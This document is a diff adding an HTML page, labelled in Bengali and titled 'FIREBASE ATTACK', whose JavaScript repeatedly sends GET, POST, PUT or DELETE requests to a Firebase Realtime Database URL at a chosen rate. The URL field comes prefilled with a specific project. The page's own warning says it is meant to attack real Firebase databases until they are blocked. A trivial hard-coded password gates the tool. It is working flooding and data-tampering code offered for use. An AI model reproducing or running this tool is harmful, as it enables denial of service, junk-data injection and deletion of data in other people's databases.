@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🥰 SB SAKIB CHOWDHURY 🥰</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+        .container {
+            background-color: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #d32f2f;
+            text-align: center;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #ffcdd2;
+            padding-bottom: 15px;
+        }
+        /* Login Page Styles */
+        #loginPage {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg,#ff5252,#d32f2f);
+        }
+        .login-box {
+            background: #fff;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        .login-box h2 {
+            margin-bottom: 25px;
+            color: #d32f2f;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 14px;
+            background: #d32f2f;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .login-box button:hover {
+            background: #b71c1c;
+        }
+        .error-msg {
+            color: red;
+            font-size: 14px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        /* Hide main app initially */
+        #mainApp { display: none; }
+        .warning {
+            background-color: #ffebee;
+            border: 1px solid #d32f2f;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            font-size: 15px;
+        }
+        label { display:block;margin-bottom:8px;font-weight:bold;color:#555;}
+        input,textarea,select{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-family:inherit;font-size:15px;}
+        .input-group{display:flex;gap:15px;}
+        .input-group>div{flex:1;}
+        button{background-color:#d32f2f;color:white;border:none;padding:14px 25px;border-radius:6px;cursor:pointer;font-size:16px;width:100%;margin-top:10px;transition:background-color 0.3s;}
+        button:hover{background-color:#b71c1c;}
+        button:disabled{background-color:#cccccc;cursor:not-allowed;}
+        #status{margin-top:25px;padding:20px;border-radius:8px;}
+        .success{background-color:#e8f5e9;border-left:5px solid #4caf50;}
+        .error{background-color:#ffebee;border-left:5px solid #d32f2f;}
+        .info{background-color:#e3f2fd;border-left:5px solid #2196f3;}
+        .stats{display:flex;justify-content:space-between;margin-top:20px;padding:15px;background-color:#f5f5f5;border-radius:8px;font-size:14px;}
+        .stat-item{text-align:center;}
+        .stat-value{font-size:18px;font-weight:bold;color:#d32f2f;}
+        .controls{display:flex;gap:10px;margin-top:15px;}
+        .controls button{width:auto;}
+        .stop-btn{background-color:#f44336;}
+        .pause-btn{background-color:#ff9800;}
+        .resume-btn{background-color:#4caf50;}
+        .request-list{margin-top:20px;max-height:200px;overflow-y:auto;border:1px solid #ddd;border-radius:6px;padding:10px;}
+        .request-item{padding:8px;border-bottom:1px solid #eee;font-family:monospace;font-size:13px;}
+        .request-item:last-child{border-bottom:none;}
+        .url-display{background-color:#f9f9f9;padding:12px;border-radius:6px;border:1px solid #ddd;margin-top:5px;word-break:break-all;font-family:monospace;font-size:14px;}
+    </style>
+</head>
+<body>
+    <!-- Login Page -->
+    <div id="loginPage">
+        <div class="login-box">
+            <h2>🔒 Secure Login</h2>
+            <div class="error-msg" id="errorMsg">⚠️ ভুল পাসওয়ার্ড!</div>
+            <input type="password" id="passwordInput" placeholder="পাসওয়ার্ড লিখুন">
+            <button onclick="checkLogin()">লগইন</button>
+        </div>
+    </div>
+
+    <!-- Main App -->
+    <div id="mainApp">
+        <div class="container">
+            <h1>🤣 FIREBASE ATTACK ☠️</h1>
+            <div class="warning">
+                <strong>সতর্কতা:</strong> এই টুলটি সত্যিকারের Firebase ডাটাবেসে অ্যাটাক করার কাজে ব্যবহার করা হবে এটাতে অ্যাটাক করলে কিছুক্ষণের ভেতরে ফায়ার ব্যাস ব্লক হয়ে যাবে ধন্যবাদ 🤣🤣🥰🥰🥰
+            </div>
+            <div class="form-group">
+                <label for="firebaseUrl">ফায়ারবেস URL</label>
+                <input type="text" id="firebaseUrl" placeholder="https://your-project.firebaseio.com/.json" value="https://update-62381-default-rtdb.firebaseio.com/.json">
+                <div class="url-display">
+                    বর্তমান URL: <span id="currentUrl">https://update-62381-default-rtdb.firebaseio.com/test.json</span>
+                </div>
+            </div>
+            <div class="input-group">
+                <div class="form-group">
+                    <label for="requestCount">রিকোয়েস্ট সংখ্যা</label>
+                    <input type="number" id="requestCount" value="10" min="1" max="1000">
+                </div>
+                <div class="form-group">
+                    <label for="delay">বিলম্ব (মিলিসেকেন্ড)</label>
+                    <input type="number" id="delay" value="500" min="10" max="5000">
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="requestType">রিকোয়েস্ট টাইপ</label>
+                <select id="requestType">
+                    <option value="GET">GET (ডেটা পড়ুন)</option>
+                    <option value="POST" selected>POST (ডেটা যোগ করুন)</option>
+                    <option value="PUT">PUT (ডেটা আপডেট করুন)</option>
+                    <option value="DELETE">DELETE (ডেটা মুছুন)</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="title">শিরোনাম (POST/PUT এর জন্য)</label>
+                <input type="text" id="title" placeholder="শিরোনাম লিখুন" value="টেস্ট ডেটা">
+            </div>
+            <div class="form-group">
+                <label for="description">বিবরণ (POST/PUT এর জন্য)</label>
+                <textarea id="description" rows="4" placeholder="বিবরণ লিখুন">এটি একটি টেস্ট ডেটা যা Firebase-এ সংরক্ষণ করা হচ্ছে</textarea>
+            </div>
+            <button onclick="startRequests()">রিকোয়েস্ট শুরু করুন</button>
+            <div class="controls">
+                <button class="pause-btn" onclick="pauseRequests()" id="pauseBtn" disabled>বিরতি</button>
+                <button class="resume-btn" onclick="resumeRequests()" id="resumeBtn" disabled>চালিয়ে যান</button>
+                <button class="stop-btn" onclick="stopRequests()" id="stopBtn" disabled>বন্ধ করুন</button>
+            </div>
+            <div class="stats">
+                <div class="stat-item"><div>মোট রিকোয়েস্ট</div><div class="stat-value" id="totalRequests">0</div></div>
+                <div class="stat-item"><div>সফল রিকোয়েস্ট</div><div class="stat-value" id="successfulRequests">0</div></div>
+                <div class="stat-item"><div>ব্যর্থ রিকোয়েস্ট</div><div class="stat-value" id="failedRequests">0</div></div>
+                <div class="stat-item"><div>অবস্থা</div><div class="stat-value" id="currentStatus">বন্ধ</div></div>
+            </div>
+            <div id="status" class="info">প্রস্তুত: Firebase URL সেট করা হয়েছে। রিকোয়েস্ট শুরু করতে "রিকোয়েস্ট শুরু করুন" বাটনে ক্লিক করুন।</div>
+            <div class="request-list" id="requestList">
+                <div class="request-item">রিকোয়েস্ট লগ এখানে দেখানো হবে...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 🔐 Login system
+        function checkLogin() {
+            const pass = document.getElementById("passwordInput").value;
+            const errorMsg = document.getElementById("errorMsg");
+            if(pass === "1234"){
+                document.getElementById("loginPage").style.display="none";
+                document.getElementById("mainApp").style.display="block";
+            } else {
+                errorMsg.style.display="block";
+            }
+        }
+
+        let requestInterval;
+        let isRequesting = false;
+        let isPaused = false;
+        let totalRequests = 0;
+        let successfulRequests = 0;
+        let failedRequests = 0;
+
+        document.getElementById('firebaseUrl').addEventListener('input', function() {
+            document.getElementById('currentUrl').textContent = this.value || 'URL 입력 করুন';
+        });
+        function updateStats() {
+            document.getElementById('totalRequests').textContent = totalRequests;
+            document.getElementById('successfulRequests').textContent = successfulRequests;
+            document.getElementById('failedRequests').textContent = failedRequests;
+            document.getElementById('currentStatus').textContent = isPaused ? 'বিরত' : (isRequesting ? 'চলছে' : 'বন্ধ');
+        }
+        function addRequestLog(message) {
+            const requestList = document.getElementById('requestList');
+            const newItem = document.createElement('div');
+            newItem.className = 'request-item';
+            newItem.textContent = `${new Date().toLocaleTimeString()}: ${message}`;
+            requestList.prepend(newItem);
+            if (requestList.children.length > 20) {
+                requestList.removeChild(requestList.lastChild);
+            }
+        }
+        function startRequests() {
+            const firebaseUrl = document.getElementById('firebaseUrl').value;
+            const requestCount = parseInt(document.getElementById('requestCount').value);
+            const delay = parseInt(document.getElementById('delay').value);
+            const requestType = document.getElementById('requestType').value;
+            const title = document.getElementById('title').value;
+            const description = document.getElementById('description').value;
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.display = 'block';
+            if (!firebaseUrl) {statusDiv.className = 'error';statusDiv.innerHTML = 'ফায়ারবেস URL প্রয়োজন';return;}
+            if (requestCount <= 0 || delay <= 0) {statusDiv.className = 'error';statusDiv.innerHTML = 'রিকোয়েস্ট সংখ্যা এবং বিলম্ব অবশ্যই 0 এর বেশি হতে হবে';return;}
+            if ((requestType === 'POST' || requestType === 'PUT') && (!title || !description)) {
+                statusDiv.className = 'error';statusDiv.innerHTML = 'POST বা PUT রিকোয়েস্টের জন্য শিরোনাম এবং বিবরণ প্রয়োজন';return;}
+            totalRequests=0;successfulRequests=0;failedRequests=0;updateStats();
+            document.getElementById('requestList').innerHTML = '';
+            statusDiv.className = 'info';statusDiv.innerHTML = `রিকোয়েস্ট শুরু হয়েছে... (${requestType})`;
+            document.getElementById('pauseBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = false;
+            document.getElementById('resumeBtn').disabled = true;
+            document.querySelector('button[onclick="startRequests()"]').disabled = true;
+            isRequesting=true;isPaused=false;updateStats();
+            let requestsSent=0;
+            requestInterval = setInterval(async () => {
+                if (isPaused) return;
+                if (requestsSent >= requestCount) {
+                    stopRequests();
+                    statusDiv.className = 'success';
+                    statusDiv.innerHTML = 'সমস্ত রিকোয়েস্ট সম্পন্ন হয়েছে!';
+                    return;
+                }
+                const data = {title:title,description:description,timestamp:new Date().toISOString(),requestNumber:requestsSent+1};
+                const requestOptions = {method:requestType,headers:{'Content-Type':'application/json'}};
+                if (requestType === 'POST' || requestType === 'PUT') {requestOptions.body=JSON.stringify(data);}
+                try {
+                    const response = await fetch(firebaseUrl, requestOptions);
+                    totalRequests++;requestsSent++;
+                    if (response.ok) {successfulRequests++;addRequestLog(`রিকোয়েস্ট #${totalRequests} সফল (${requestType})`);}
+                    else {failedRequests++;addRequestLog(`রিকোয়েস্ট #${totalRequests} ব্যর্থ (${requestType}): ${response.status}`);}
+                    updateStats();
+                    if (totalRequests % 5 === 0 || totalRequests === 1) {
+                        statusDiv.innerHTML = `${totalRequests}টি রিকোয়েস্ট পাঠানো হয়েছে... (${successfulRequests} সফল, ${failedRequests} ব্যর্থ)`;
+                    }
+                } catch (error) {
+                    totalRequests++;requestsSent++;failedRequests++;
+                    addRequestLog(`রিকোয়েস্ট #${totalRequests} ত্রুটি: ${error.message}`);
+                    updateStats();
+                    statusDiv.innerHTML = `${totalRequests}টি রিকোয়েস্ট পাঠানো হয়েছে... (${successfulRequests} সফল, ${failedRequests} ব্যর্থ)`;
+                }
+            }, delay);
+        }
+        function pauseRequests(){isPaused=true;document.getElementById('pauseBtn').disabled=true;document.getElementById('resumeBtn').disabled=false;updateStats();const statusDiv=document.getElementById('status');statusDiv.className='info';statusDiv.innerHTML='রিকোয়েস্ট বিরত আছে...';}
+        function resumeRequests(){isPaused=false;document.getElementById('pauseBtn').disabled=false;document.getElementById('resumeBtn').disabled=true;updateStats();const statusDiv=document.getElementById('status');statusDiv.className='info';statusDiv.innerHTML='রিকোয়েস্ট চালিয়ে যাওয়া হচ্ছে...';}
+        function stopRequests(){clearInterval(requestInterval);isRequesting=false;isPaused=false;document.getElementById('pauseBtn').disabled=true;document.getElementById('resumeBtn').disabled=true;document.getElementById('stopBtn').disabled=true;document.querySelector('button[onclick="startRequests()"]').disabled=false;updateStats();const statusDiv=document.getElementById('status');if(totalRequests>0){statusDiv.className='success';statusDiv.innerHTML=`রিকোয়েস্ট বন্ধ করা হয়েছে। মোট: ${totalRequests}, সফল: ${successfulRequests}, ব্যর্থ: ${failedRequests}`;}}
+    </script>
+</body>
+</html> 
